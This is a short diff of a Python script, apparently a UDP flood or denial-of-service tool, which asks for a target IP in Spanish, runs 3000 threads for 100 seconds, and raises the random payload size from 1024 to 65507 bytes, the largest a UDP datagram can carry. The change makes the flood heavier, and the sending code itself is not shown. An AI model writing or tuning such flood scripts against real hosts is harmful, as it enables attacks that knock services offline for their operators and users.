@@ -8,7 +8,7 @@ import os
 ip = input("🎯 IP objetivo: ").strip()
 duration = 100
 threads = 3000
-packet_size = 1024
+packet_size = 65507
 payload = random._urandom(packet_size)
 timeout = time.time() + duration
 
